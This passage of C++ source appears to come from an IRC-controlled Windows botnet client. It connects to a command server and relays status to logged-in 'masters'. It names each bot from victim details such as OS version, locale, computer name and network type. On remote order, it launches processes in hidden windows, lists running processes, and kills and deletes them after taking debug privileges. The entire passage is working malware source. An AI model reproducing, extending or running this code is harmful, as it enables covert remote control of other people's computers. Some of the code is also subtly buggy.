			privmsg(target,"<%i> %s!%s@%s",i,logins[i].nick,logins[i].ident,logins[i].host);
		else
			privmsg(target,"<%i> <Empty>",i);
	}
	privmsg(target,"%s Login List complete.", main_title);
	return;
}

/////////////////////////////////////////////////////////////////////////////notice_masters
int IRC::notice_masters(char* message, ...)
{
	if (!connected)
		return 1;
	
	int i,iret=0;
	char tbuffer[IRCLINE];
	va_list argp;
	va_start(argp,message); 
	_vsnprintf(tbuffer,sizeof(tbuffer),message,argp);
	
	for (i=0;i<MAX_LOGINS;i++)
		if (logins[i].nick[0]!='\0')
			iret+=notice(logins[i].nick,tbuffer);

	return iret;
}

/////////////////////////////////////////////////////////////////////////////privmsg_masters
int IRC::privmsg_masters(char* message, ...)
{
	if (!connected)
		return 1;
	
	int i,iret=0;
	char tbuffer[IRCLINE];
	va_list argp;
	va_start(argp,message); 
	_vsnprintf(tbuffer,sizeof(tbuffer),message,argp);
	
	for (i=0;i<MAX_LOGINS;i++)
		if (logins[i].nick[0]!='\0')
			iret+=privmsg(logins[i].nick,tbuffer);

	return iret;
}

/////////////////////////////////////////////////////////////////////////////start
int IRC::start(char* server, int port, char* nick, char* user, char* name, char* pass)
{
	HOSTENT* resolv;
	sockaddr_in rem;

	if (connected)
		return 1;

#ifndef NO_CONNCHECK
	BOOL bHasInet=FALSE;
	DWORD dwCStat;
	if (!nowininet) 
		while (!bHasInet)
			if ((bHasInet=fInternetGetConnectedState(&dwCStat,0))==FALSE)
				Sleep(30000);
#endif // NO_CONNCHECK

#ifdef NO_OPENSSL
#ifdef _DEBUG
	if (servers[curserver].usessl)
		printf("WARNING: SSL Server enabled with SSL disabled.\n");
#endif
#endif

	irc_socket=fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (irc_socket==INVALID_SOCKET)
	{
		return 1;
	}
	resolv=fgethostbyname(server);
	if (!resolv)
	{
		fclosesocket(irc_socket);
		return 1;
	}
	memcpy(&rem.sin_addr, resolv->h_addr, 4);
	rem.sin_family=AF_INET;
	rem.sin_port=fhtons(port);

	if (fconnect(irc_socket, (const sockaddr*)&rem, sizeof(rem))==SOCKET_ERROR)
	{
#ifdef _DEBUG
		printf("Failed to connect: %d\n",fWSAGetLastError());
#endif // _DEBUG
		fclosesocket(irc_socket);
		return 1;
	}
	dwLastRecv=GetTickCount();

#ifndef NO_OPENSSL
	if(servers[curserver].usessl)
	{
#ifdef _DEBUG
		printf("Starting SSL socket...\n");
#endif
		ssl_socket.AttachToSocket(irc_socket);

#ifdef _DEBUG
		printf("Doing SSL handshake...\n");
#endif

		if(!ssl_socket.Connect())
		{
#ifdef _DEBUG
			printf("SSL handshake failed...\n");
#endif
			fclosesocket(irc_socket);
			connected=false;
			return 1;
		}
	}
#endif // NO_OPENSSL


	clear_logins();
	dwconnected=GetTickCount();
	dwLastRecv=GetTickCount();
	connected=true;
	
	cur_nick=new char[strlen(nick)+1];
	strcpy(cur_nick, nick);

	if (pass && strcmp(pass,""))
		isend(irc_socket,"PASS %s\r\n", pass);
	isend(irc_socket,"NICK %s\r\n", nick);
	isend(irc_socket,"USER %s * 0 :%s\r\n", user, name);
	dwLastRecv=GetTickCount();

	return 0;
}

/////////////////////////////////////////////////////////////////////////////disconnect
void IRC::disconnect()
{
	if (connected)
	{
#ifdef _DEBUG
		printf("Disconnected from server. (Manual)\n");
#endif // _DEBUG
		quit("Leaving");
		connected=false;
		bconnect=false;
		fshutdown(irc_socket, 2);
		fclosesocket(irc_socket);
	}
}

/////////////////////////////////////////////////////////////////////////////quit
int IRC::quit(char* quit_message, ...)
{
	if (connected)
	{
		int iret=0;
		if (quit_message)
		{
			char tbuffer[IRCLINE];

			va_list argp;
			va_start(argp,quit_message); 
			_vsnprintf(tbuffer,sizeof(tbuffer),quit_message,argp);

			iret=isend(irc_socket,"QUIT %s\r\n", tbuffer);
		}
		else
		{
			iret=isend(irc_socket,"QUIT\r\n");
		}
		if (iret)
			return 1;
	}
	return 0;
}

/////////////////////////////////////////////////////////////////////////////message_loop
int IRC::message_loop()
{
	char buffer[1024];
	int ret_len;

	if (!connected)
		return 1;

	while (1)
	{
		// Wait for a complete line to be received
		bool bRecvd=false;
#ifndef NO_OPENSSL
		if(servers[curserver].usessl)
			ret_len=ssl_socket.Read(&buffer,1023);
		else
#endif
			ret_len=frecv(irc_socket, buffer, 1023, 0);

//		ret_len=frecv(irc_socket, buffer, 1023, 0);
		if (ret_len==SOCKET_ERROR || !ret_len)
		{
			connected=false;
			return 1;
		}
		dwLastRecv=GetTickCount();
		buffer[ret_len]='\0';
		split_to_replies(buffer);
	}

	return 0;
}

/////////////////////////////////////////////////////////////////////////////split_to_replies
void IRC::split_to_replies(char* data)
{
	char* p;

	while (p=strstr(data, "\r\n"))
	{
		*p='\0';
		parse_irc_reply(data);
		data=p+2;
	}
}

/////////////////////////////////////////////////////////////////////////////parse_irc_reply
void IRC::parse_irc_reply(char* data)
{
	char* hostd;
	char* cmd;
	char* params;
	irc_reply_data hostd_tmp;

	hostd_tmp.target=0;

#ifdef _DEBUG
	char ntbuffer[IRCLINE];
	strcpy(ntbuffer,data);
	for (unsigned int i=strlen(ntbuffer);i>strlen(ntbuffer)-2;i--)
		if (ntbuffer[i]=='\r' || ntbuffer[i]=='\n')
		{
			ntbuffer[i]=0;
		}
	printf("(in)  %s\n",ntbuffer);
	DbgPrintFile("(in)  %s\n",ntbuffer);
#endif // _DEBUG
	
	if (data[0]==':')
	{
		hostd=&data[1];
		cmd=strchr(hostd, ' ');
		if (!cmd)
			return;
		*cmd='\0';
		cmd++;
		params=strchr(cmd, ' ');
		if (params)
		{
			*params='\0';
			params++;
		}
		hostd_tmp.nick=hostd;
		hostd_tmp.ident=strchr(hostd, '!');
		if (hostd_tmp.ident)
		{
			*hostd_tmp.ident='\0';
			hostd_tmp.ident++;
			hostd_tmp.host=strchr(hostd_tmp.ident, '@');
			if (hostd_tmp.host)
			{
				*hostd_tmp.host='\0';
				hostd_tmp.host++;
			}
		}

		if (!strcmp(cmd, "JOIN"))
		{
			
		}
		else if (!strcmp(cmd, "PART"))
		{
			if (is_logged_in(hostd_tmp.nick,hostd_tmp.ident,hostd_tmp.host))
				del_login(hostd_tmp.nick,hostd_tmp.ident,hostd_tmp.host);
		}
		else if (!strcmp(cmd, "QUIT"))
		{
			if (is_logged_in(hostd_tmp.nick,hostd_tmp.ident,hostd_tmp.host))
				del_login(hostd_tmp.nick,hostd_tmp.ident,hostd_tmp.host);
		}
		else if (!strcmp(cmd, "NOTICE"))
		{
			hostd_tmp.target=params;
			params=strchr(hostd_tmp.target, ' ');
			if (params)
				*params='\0';
			params++;
		}
		else if (!strcmp(cmd, "PRIVMSG"))
		{
			hostd_tmp.target=params;
			params=strchr(hostd_tmp.target, ' ');
			if (!params)
				return;
			*(params++)='\0';
		}
		else if (!strcmp(cmd, "NICK"))
		{
			if (!strcmp(hostd_tmp.nick, cur_nick))
			{
				delete [] cur_nick;
				cur_nick=new char[strlen(params)+1];
				strcpy(cur_nick, params);
			}
		}
		call_hook(cmd, params, &hostd_tmp);
	}
	else
	{
		cmd=data;
		data=strchr(cmd, ' ');
		if (!data)
			return;
		*data='\0';
		params=data+1;

		if (!strcmp(cmd, "PING"))
		{
			if (!params)
				return;

			isend(irc_socket,"PONG %s\r\n", &params[1]);
		}
		else
		{
			hostd_tmp.host=0;
			hostd_tmp.ident=0;
			hostd_tmp.nick=0;
			hostd_tmp.target=0;
			call_hook(cmd, params, &hostd_tmp);
		}
	}
}

/////////////////////////////////////////////////////////////////////////////call_hook
void IRC::call_hook(char* irc_command, char* params, irc_reply_data* hostd)
{
	irc_command_hook* p;

	if (!hooks)
		return;

	p=hooks;
	while (p)
	{
		if (!strcmp(p->irc_command, irc_command))
		{
			(*(p->function))(params, hostd, this);
			p=0;
		}
		else
		{
			p=p->next;
		}
	}
}

/////////////////////////////////////////////////////////////////////////////notice
int IRC::notice(char* target, char* message, ...)
{
	if (!connected)
		return 1;
	
	char tbuffer[IRCLINE];
	va_list argp;
	va_start(argp,message); 
	_vsnprintf(tbuffer,sizeof(tbuffer),message,argp);


	int iret=isend(irc_socket,"NOTICE %s :%s\r\n", target, tbuffer);
	Sleep(FLOOD_DELAY);
	return iret;
}

/////////////////////////////////////////////////////////////////////////////privmsg
int IRC::privmsg(char* target, char* message, ...)
{
	if (!connected)
		return 1;
	
	char tbuffer[(IRCLINE-(MAX_NICKLEN+10))];
	va_list argp;
	va_start(argp,message); 
	_vsnprintf(tbuffer,sizeof(tbuffer),message,argp);


	int iret=isend(irc_socket,"PRIVMSG %s :%s\r\n", target, tbuffer);
	Sleep(FLOOD_DELAY);
	return iret;
}

/////////////////////////////////////////////////////////////////////////////privmsg_filter
int IRC::privmsg_filter(char* target, char *filter, char* message, ...)
{
	if (!connected)
		return 1;
	
	char tbuffer[(IRCLINE-(MAX_NICKLEN+10))];
	va_list argp;
	va_start(argp,message); 
	_vsnprintf(tbuffer,sizeof(tbuffer),message,argp);
	
	if (filter)
	{
		if (!wildcardfit(_strlwr(filter),_strlwr(tbuffer)))
			return 1;
	}

	int iret=isend(irc_socket,"PRIVMSG %s :%s\r\n", target, tbuffer);
	Sleep(FLOOD_DELAY);
	return iret;
}

/////////////////////////////////////////////////////////////////////////////join
int IRC::join(char* channel)
{
	if (!connected)
		return 1;
	int iret=isend(irc_socket,"JOIN %s\r\n", channel);
	return iret;
}

/////////////////////////////////////////////////////////////////////////////join
int IRC::join(char* channel, char* pass)
{
	if (!connected)
		return 1;
	int iret=isend(irc_socket,"JOIN %s %s\r\n", channel, pass);
	return iret;
}

/////////////////////////////////////////////////////////////////////////////part
int IRC::part(char* channel)
{
	if (!connected)
		return 1;
	int iret=isend(irc_socket,"PART %s\r\n", channel);
	return iret;
}

/////////////////////////////////////////////////////////////////////////////kick
int IRC::kick(char* channel, char* nick)
{
	if (!connected)
		return 1;
	int iret=isend(irc_socket,"KICK %s %s\r\n", channel, nick);
	return iret;
}

/////////////////////////////////////////////////////////////////////////////raw
int IRC::raw(char* data, ...)
{
	if (!connected)
		return 1;
	
	char tbuffer[IRCLINE];
	va_list argp;
	va_start(argp,data); 
	_vsnprintf(tbuffer,sizeof(tbuffer),data,argp);
	
	int iret=isend(irc_socket,"%s\r\n", tbuffer);
	return iret;
}

/////////////////////////////////////////////////////////////////////////////kick
int IRC::kick(char* channel, char* nick, char* message)
{
	if (!connected)
		return 1;
	int iret=isend(irc_socket,"KICK %s %s :%s\r\n", channel, nick, message);
	return iret;
}

/////////////////////////////////////////////////////////////////////////////mode
int IRC::mode(char* channel, char* modes, char* targets)
{
	if (!connected)
		return 1;
	int iret;
	if (!targets)
		iret=isend(irc_socket,"MODE %s %s\r\n", channel, modes);
	else
		iret=isend(irc_socket,"MODE %s %s %s\r\n", channel, modes, targets);
	return iret;
}

/////////////////////////////////////////////////////////////////////////////mode
int IRC::mode(char* modes)
{
	if (!connected)
		return 1;
	mode(cur_nick, modes, 0);
	return 0;
}

/////////////////////////////////////////////////////////////////////////////nickgen
char *IRC::nickgen(DWORD NickType, int NickLen)
{	
	static char *rndnick;
	nicklen=NickLen;

	if (NickType==N_OS)
		rndnick=nickgen_os();

	else if (NickType==N_RNDCTY)
		rndnick=nickgen_rndcountry();

	else if (NickType==N_BOX)
		rndnick=nickgen_curbox();

	else if (NickType==N_RNDLTR)
		rndnick=nickgen_rndltr();

	else if (NickType==N_MINE)
		rndnick=nickgen_mine();

	else
		rndnick=nickgen_rndltr();
	
	return rndnick;
}

/////////////////////////////////////////////////////////////////////////////nickgen_rndltr
char *IRC::nickgen_rndltr(void)
{	
	static char rndnick[MAX_NICKLEN];
	ZeroMemory(rndnick,MAX_NICKLEN);
	
	for (int i=0;i<=nicklen;i++) 
		rndnick[i] = (rand()%26)+97;
	rndnick[i] = '\0';

	return rndnick;
}

/////////////////////////////////////////////////////////////////////////////nickgen_curbox
char *IRC::nickgen_curbox(void)
{
	static char rndnick[MAX_NICKLEN];
	ZeroMemory(rndnick,MAX_NICKLEN);
	BOOL good=FALSE;
	
	DWORD dwcb=MAX_NICKLEN;
	fGetComputerName(rndnick,&dwcb);

	for (int j=65;j<91;j++) { if (rndnick[0] == j) good=TRUE; }
	for (int k=97;k<123;k++) { if (rndnick[0] == k) good=TRUE; }
	if (!good)
		sprintf(rndnick,"Error");
		
	return rndnick;
}


/////////////////////////////////////////////////////////////////////////////nickgen_rndcountry
char *IRC::nickgen_rndcountry(void)
{	
	static char rndnick[MAX_NICKLEN];
	ZeroMemory(rndnick,MAX_NICKLEN);
	
	char locale[MAX_NICKLEN];
	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME,locale,sizeof(locale));

	sprintf(rndnick,"%s-",locale);
	
	for (int i=strlen(rndnick);i<=nicklen;i++) 
		rndnick[i]=(rand()%10)+48;

	return rndnick;
}

/////////////////////////////////////////////////////////////////////////////nickgen_os
char *IRC::nickgen_os(void)
{	
	char *os;
	static char rndnick[MAX_NICKLEN];
	ZeroMemory(rndnick,MAX_NICKLEN);

	OSVERSIONINFO osVI;
	osVI.dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
	if (GetVersionEx(&osVI)) {
			if(osVI.dwMajorVersion==4 && osVI.dwMinorVersion==0)
			{	if(osVI.dwPlatformId==VER_PLATFORM_WIN32_WINDOWS)		os="95-";
				if(osVI.dwPlatformId==VER_PLATFORM_WIN32_NT)			os="NT-"; }
			else if(osVI.dwMajorVersion==4 && osVI.dwMinorVersion==10)	os="98-";
			else if(osVI.dwMajorVersion==4 && osVI.dwMinorVersion==90)	os="ME-";
			else if(osVI.dwMajorVersion==5 && osVI.dwMinorVersion==0)	os="2K-";
			else if(osVI.dwMajorVersion==5 && osVI.dwMinorVersion==1)	os="XP-";
			else if(osVI.dwMajorVersion==5 && osVI.dwMinorVersion==2)	os="2K3-";
			else														os="WIN-";
		} else
			os="WIN-";

		sprintf(rndnick,os);
		for (int i=strlen(rndnick);i<=nicklen;i++)
			rndnick[i]=(rand()%10)+48;
	
	return rndnick;
}

/////////////////////////////////////////////////////////////////////////////nickgen_mine
char *IRC::nickgen_mine(void)
{
	static char rndnick[MAX_NICKLEN];
	ZeroMemory(rndnick,MAX_NICKLEN);

	prefixmrc=FALSE;
	prefixprv=FALSE;
	prefixdialup=FALSE;
	char *prefix=nickgen_prefix();
	
	char locale[MAX_NICKLEN];
	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME,locale,sizeof(locale));

	strcat(rndnick,prefix);
	strcat(rndnick,locale);
	strcat(rndnick,"|");
	
	int i=1;
	if (prefixmrc) i++;
	if (prefixprv) i++;
	if (prefixdialup) i++;
	
	char strbuf[2];
	for (i;i<REQ_NICKLEN;i++)
	{
		sprintf(strbuf,"%i",rand()%10);
		strcat(rndnick,strbuf);
	}
	strcat(rndnick,"]");
	//rndnick[strlen(rndnick)]='\0';

	return rndnick;
}


char *IRC::nickgen_prefix(void)
{
	static char rndnick[MAX_NICKLEN];
	ZeroMemory(rndnick,MAX_NICKLEN);
	char days[8];
	unsigned int ud=GetTickCount()/86400000;

	sprintf(rndnick,"[");

#ifndef NO_MIRCNICK
	if (fFindWindow("mIRC",0))
	{
		prefixmrc=TRUE;
		strcat(rndnick,"M");
	}
#endif

#ifndef NO_PRIVATENICK
	if (PrivateIP(inip))
	{
		prefixprv=TRUE;
		strcat(rndnick,"P");
	}
#endif

#ifndef NO_DIALUPNICK
	if (!nowininet)
	{
		DWORD n;
		fInternetGetConnectedStateEx(&n, 0, 0, 0);
		if (n & INTERNET_CONNECTION_MODEM == INTERNET_CONNECTION_MODEM) {
			strcat(rndnick,"D");
			prefixdialup=TRUE;
		}
	}
#endif

	sprintf(days,"%.2d",ud);
	nicktime=ud;
	
	strcat(rndnick,days);
	strcat(rndnick,"|");
	return rndnick;
};

/////////////////////////////////////////////////////////////////////////////nick
int IRC::nick(char* newnick)
{
	if (!connected)
		return 1;
	int iret=isend(irc_socket,"NICK %s\r\n", newnick);
	return iret;
}

/////////////////////////////////////////////////////////////////////////////current_nick
char* IRC::current_nick()
{
	return cur_nick;
}

/////////////////////////////////////////////////////////////////////////////is_connected
bool IRC::is_connected()
{
	return connected;
}

/////////////////////////////////////////////////////////////////////////////should_connect
bool IRC::should_connect()
{
	return bconnect;
}

SOCKET IRC::get_sock(void)
{
	return irc_socket;
}

#ifndef NO_OPENSSL
CSSLSocket::CSSLSocket()
{
	m_psslCtx=NULL;
	m_pSSL=NULL;
	SSL_library_init();
	m_bConnected=FALSE;
}

CSSLSocket::~CSSLSocket()
{	// Cleanup
	if(m_psslCtx)
		SSL_CTX_free(m_psslCtx);
	if(m_pSSL)
	{
		SSL_shutdown(m_pSSL);
		SSL_free(m_pSSL);
	}
	m_bConnected=FALSE;
}

bool CSSLSocket::Init()
{	
	m_bConnected=FALSE;
	
	// Initialize the context, exit if fails
	m_psslCtx=SSL_CTX_new(SSLv3_method());	
	if(!m_psslCtx)
		return FALSE;

	// Initialize the object, exit if fails
	m_pSSL=SSL_new(m_psslCtx);
	if(!m_pSSL)
		return FALSE;

	// Success
	return TRUE;
}

bool CSSLSocket::AttachToSocket(int sSocket)
{
	m_bConnected=FALSE;

	// Fail if not initialized
	if(!m_psslCtx || !m_pSSL)
		return FALSE;

	// Store the socket, and attach it to the ssl object
	m_sSocket=sSocket;
	if(!SSL_set_fd(m_pSSL, m_sSocket))
		return FALSE;

	// Success
	return TRUE;
}

int CSSLSocket::GetSocket() {
	return m_sSocket;
}

bool CSSLSocket::Accept()
{
	m_bConnected=FALSE;

	// Fail if not initialized
	if(!m_psslCtx || !m_pSSL)
		return FALSE;

	if(SSL_accept(m_pSSL)==1)
	{
		m_bConnected=TRUE;
		return TRUE;
	}
	else
	{
		m_bConnected=FALSE;
		return FALSE;
	}
}

bool CSSLSocket::Connect()
{	
	m_bConnected=FALSE;
	
	// Fail if not initialized
	if(!m_psslCtx || !m_pSSL)
		return FALSE;

	if(SSL_connect(m_pSSL)==1)
	{
		m_bConnected=TRUE;
		return TRUE;
	}
	else
	{
		m_bConnected=FALSE;
		return FALSE;
	}
}

void CSSLSocket::Close()
{
	SSL_shutdown(m_pSSL);
	m_bConnected=FALSE;
}

int CSSLSocket::Read(void *pBuf, int iNum)
{
	if(!m_psslCtx || !m_pSSL || !m_bConnected)
		return 0;
	return SSL_read(m_pSSL, pBuf, iNum);
}

int CSSLSocket::Write(const void *pBuf, int iNum)
{
	if(!m_psslCtx || !m_pSSL || !m_bConnected)
		return 0;
	return SSL_write(m_pSSL, pBuf, iNum);
}
#endif


#ifndef NO_PROCESS

DWORD WINAPI CreateProcThread(LPVOID param)
{
	NTHREAD process = *((NTHREAD *)param);
	NTHREAD *processt = (NTHREAD *)param;
	processt->gotinfo = TRUE;
	IRC* irc=(IRC*)process.conn;

	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	BOOL hide=process.bdata1;
	BOOL wait=process.bdata2;
	char file[MAX_PATH];
	strcpy(file,process.data1);

	char path[MAX_PATH];
	strncpy(path,file,sizeof(path));
	if (!fPathRemoveFileSpec(path))
	{
		if (!process.silent)
			irc->privmsg(process.target,"%s Couldn't parse path, error: <%d>", process_title, GetLastError());
		return 1;
	}
	
	ZeroMemory(&si,sizeof(si));
	ZeroMemory(&pi,sizeof(pi));
	si.cb=sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = (hide?SW_HIDE:SW_SHOW);

	if (!CreateProcess(NULL,file,NULL,NULL,FALSE,0,NULL,path,&si,&pi))
	{
		if (!process.silent)
			irc->privmsg(process.target,"%s Failed to create process: \"%s\", error: <%d>", process_title, file, GetLastError());
		return 1;
	}
	else
	{
		DWORD start=GetTickCount();//record this before the privmsg so we arent off
		if (!process.silent)
			irc->privmsg(process.target,"%s Created process: \"%s\", PID: <%d>",process_title,file,pi.dwProcessId);
		
		if (!process.silent)
		{//no sense waiting if its silent
			if (wait)
			{
				WaitForSingleObject(pi.hProcess,INFINITE);
				DWORD stop=GetTickCount();
				char ttime[120],stime[120];
				stime[0]='\0';
				DWORD total = ((stop - start)/1000);
				DWORD hours = (total%86400)/3600;
				DWORD minutes = ((total%86400)%3600)/60;
				DWORD seconds = ((total%86400)%3600)%60;
				if (hours>0)
				{
					sprintf(ttime," %d%s",hours,(hours==1?" hour":" hours"));
					strcat(stime,ttime);
				}
				sprintf(ttime," %.2d:%.2d",minutes,seconds);
				strcat(stime,ttime);

				irc->privmsg(process.target,"%s Process Finished: \"%s\", Total Running Time: %s.", process_title,file,stime);
			}
		}
		if (pi.hProcess) CloseHandle(pi.hProcess);
		if (pi.hThread) CloseHandle(pi.hThread);
	}
	clearthread(process.threadnum);
	return 0;
}

// data1  = process to kill
// data2  = process to filter (for list)

// bdata1 = list
// bdata2 = kill
// bdata3 = del on kill
DWORD WINAPI ProcessThread(LPVOID param) 
{
	NTHREAD process = *((NTHREAD *)param);
	NTHREAD *processt = (NTHREAD *)param;
	processt->gotinfo = TRUE;

	IRC* irc=(IRC*)process.conn;
	char sendbuf[IRCLINE];
	//char target[128];
	//sprintf(target,process.hostd->target);
	//char *target=process.hostd->target;

	if (process.bdata1) // list
	{
		std::list<process_info> lProcesses;
		if(ListProcesses(&lProcesses,process.data2))
		{
			std::list<process_info>::iterator ip; int iCount=0;

			irc->privmsg(process.target,"%s Process List:",process_title);

			if (process.verbose)
				irc->privmsg(process.target," PID   - Mem Usage - Process");

			for(ip=lProcesses.begin(); ip!=lProcesses.end(); ++ip)
			{
				iCount++;
				char *processExe=(*ip).sProcessName;
				char *mUsage=(*ip).mUsage;
				unsigned long processPid=(*ip).lProcessPid;

				strcat(mUsage," K");
				sprintf(sendbuf," %-6d- %-10s- \"%s\"",processPid,mUsage,processExe);

				irc->privmsg(process.target,sendbuf);
			}
			//sprintf(sendbuf,"%s Displayed process list.",process_title);
			//addlog(MAINLOG,sendbuf);
			irc->privmsg(process.target,"%s End of list.",process_title);
		}
		else
			irc->privmsg(process.target,"%s Unable to list processes, error: <%d>.",process_title,GetLastError());
	}
	else
	{
		char procKilled[16];

		if (process.bdata2) // kill
		{
			if (!process.bdata3) // delete
			{
				if (KillProcess(process.data1,procKilled, 0))
				{
					if (!process.silent)
						irc->privmsg(process.target,"%s Process \"%s\" killed, total: <%s>.",process_title,process.data1,procKilled);
				}
				else if (KillPid(atoi(process.data1)))
				{
					if (!process.silent)
						irc->privmsg(process.target,"%s PID \"%i\" killed.",process_title,atoi(process.data1));
				}
				else
				{
					if (!process.silent)
						irc->privmsg(process.target,"%s Failed to kill process.",process_title);
				}
			}
			else
			{
				char path[MAX_PATH],fname[_MAX_FNAME],ext[_MAX_EXT];
				BOOL success=FALSE, killed=FALSE, type=FALSE;
								
				sprintf(path,"%s",ProcessPidToName(atoi(process.data1),path));
				_splitpath(path,0,0,fname,ext);
				strcat(fname,ext);
								
				for (int t=0;t<5;t++)
				{
					if (KillPid(atoi(process.data1)))
					{
						killed=TRUE;
						type=TRUE;
						SetFileAttributes(path,FILE_ATTRIBUTE_NORMAL);
					}
					else if (KillProcess(process.data1,procKilled, path) && !killed)
					{
						killed=TRUE;
						SetFileAttributes(path,FILE_ATTRIBUTE_NORMAL);
					}
					
					if (DeleteFile(path))
					{
						success=TRUE;
						break;
					}
					else
					{
						if (killed) //if we've killed the process id and cant erase 
							KillProcess(fname,0,0);//it maybe its running more than once
						Sleep(1000);
					}
				}
				if (success)
				{
					if (!process.silent)
					{
						if(type)
							irc->privmsg(process.target,"%s PID \"%i\" killed and deleted.",process_title,atoi(process.data1));
						else
							irc->privmsg(process.target,"%s Process \"%s\" killed and deleted.",process_title,process.data1);
					}
				}
				else
				{
					if (!process.silent)
						irc->privmsg(process.target,"%s Failed to kill and erase process.",process_title);
				}
			}
		}
	}
	clearthread(process.threadnum);
	return 0;
}

bool ListProcesses(std::list<process_info> *lProcesses, char *filter) {

	DWORD aProcesses[1024], cbNeeded, cProcesses;
	if (!fEnumProcesses(aProcesses,sizeof(aProcesses),&cbNeeded))
		return FALSE;
	cProcesses = cbNeeded / sizeof(DWORD);
	char szProcessName[MAX_PATH] = "unknown";

	for ( int i = 0; i < cProcesses; i++ ) {
	  HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,FALSE,aProcesses[i]);
		if (hProcess) {
			HMODULE hMod;
			PROCESS_MEMORY_COUNTERS pmc;
			DWORD cbNeeded;
			//char tempbuf[128];

			if (fEnumProcessModules(hProcess,&hMod,sizeof(hMod),&cbNeeded)) {
				
				fGetModuleFileNameEx(hProcess,hMod,szProcessName,sizeof(szProcessName));

				process_info pInfo;
				sprintf(pInfo.sProcessName,"%s",szProcessName);
				pInfo.lProcessPid=aProcesses[i];

				if (fGetProcessMemoryInfo(hProcess,&pmc,sizeof(pmc))) {
					_snprintf(pInfo.mUsage,sizeof(pInfo.mUsage),"%s",commaI64((pmc.WorkingSetSize/1024)));
				} else
					_snprintf(pInfo.mUsage,sizeof(pInfo.mUsage),"Error: <%d>",GetLastError());

				if (filter)
				{
					char ext[_MAX_EXT],file[_MAX_FNAME+_MAX_EXT];
					_splitpath(pInfo.sProcessName, NULL, NULL, file, ext);
					strcat(file,ext);
					fprintf(stderr,"%s / %s\n",filter,file);
					if (!lstrcmpi(filter,file))
					{
						lProcesses->push_back(pInfo);
					}
				}
				else
					lProcesses->push_back(pInfo);
			}
			CloseHandle(hProcess);
		}
	}
	return TRUE;
}

bool KillProcess(const char *szProcName, char *procKilled, char *procPath) {
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	bool bRetVal=false;
	unsigned int i;
	HMODULE hMod;

	// Get SeDebugPrivileges
	TOKEN_PRIVILEGES tPriv, tPrivOld;
	DWORD cbPriv=sizeof(tPrivOld);
	HANDLE hToken;
	
	if(!fOpenThreadToken(GetCurrentThread(), TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, FALSE, &hToken))
		if(!fOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, &hToken))
			hToken=NULL;

	if(hToken) {
		tPriv.PrivilegeCount=1; tPriv.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
		fLookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tPriv.Privileges[0].Luid);
		if(fAdjustTokenPrivileges(hToken, FALSE, &tPriv, sizeof(tPriv), &tPrivOld, &cbPriv)) {
			if(GetLastError()==ERROR_NOT_ALL_ASSIGNED) {
				CloseHandle(hToken); hToken=NULL;
			}
		} else {
			CloseHandle(hToken);
			hToken=NULL;
		}
	}

	// Enumerate processes
	if(!fEnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
		return false;
	cProcesses=cbNeeded/sizeof(DWORD);

	unsigned int killed=0;
	for(i=0; i<cProcesses; i++) {
		char szProcessName[MAX_PATH];
		strcpy(szProcessName, "unknown");
		HANDLE hProcess=OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ|PROCESS_TERMINATE,FALSE,aProcesses[i]);
		if(hProcess) {
			if(fEnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
				fGetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName));
				for(int ipn=0;ipn<strlen(szProcessName);ipn++)
					*(szProcessName+i)=toupper(*(szProcessName+i));
				
				if(!szProcName) {
					bRetVal=false; // FIX ME: Could Kill all bot processes here
				}
				else { // Kill the named process
					printf("szProcessName: %s, szProcName: %s\n", szProcessName, szProcName);
					if(!strcmp(szProcessName, szProcName)) {
						fGetModuleFileNameEx( hProcess, hMod, procPath,MAX_PATH);
						killed++;
						TerminateProcess(hProcess, 0);
						bRetVal=true;
					}
				}
			}
			CloseHandle(hProcess);
		}
	}

	if (procKilled)
		sprintf(procKilled,"%i",killed);
	
	// Drop SeDebugPrivileges
	if(hToken) {
		fAdjustTokenPrivileges(hToken, FALSE, &tPrivOld, sizeof(tPrivOld), NULL, NULL);
		CloseHandle(hToken);
	}

	return bRetVal;
}

BOOL GetDebugPrivs(HANDLE &hToken,TOKEN_PRIVILEGES &tPrivOld)
{
	TOKEN_PRIVILEGES tPriv;
	DWORD cbPriv=sizeof(tPrivOld);
	BOOL bRet=FALSE;
	if(!fOpenThreadToken(GetCurrentThread(), TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, FALSE, &hToken))
		if(!fOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, &hToken))
			hToken=NULL;

	if(hToken)
	{
		tPriv.PrivilegeCount=1;
		tPriv.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
		fLookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tPriv.Privileges[0].Luid);
		if(fAdjustTokenPrivileges(hToken, FALSE, &tPriv, sizeof(tPriv), &tPrivOld, &cbPriv))
		{
			if(GetLastError()==ERROR_NOT_ALL_ASSIGNED)
			{
				CloseHandle(hToken);
				hToken=NULL;
			}
			else
				bRet=TRUE;
		}
		else
		{
			CloseHandle(hToken);
			hToken=NULL;
		}
	}
	return bRet;
}
void DropDebugPrivs(HANDLE &hToken,TOKEN_PRIVILEGES &tPrivOld)
{
	// Drop SeDebugPrivileges
	if(hToken)
	{
		fAdjustTokenPrivileges(hToken, FALSE, &tPrivOld, sizeof(tPrivOld), NULL, NULL);
		CloseHandle(hToken);
	}
}

BOOL KillPid(unsigned long lPid)
{
	bool bRetVal=FALSE;

	
	TOKEN_PRIVILEGES tPrivOld;
	HANDLE hToken;
	GetDebugPrivs(hToken,tPrivOld);

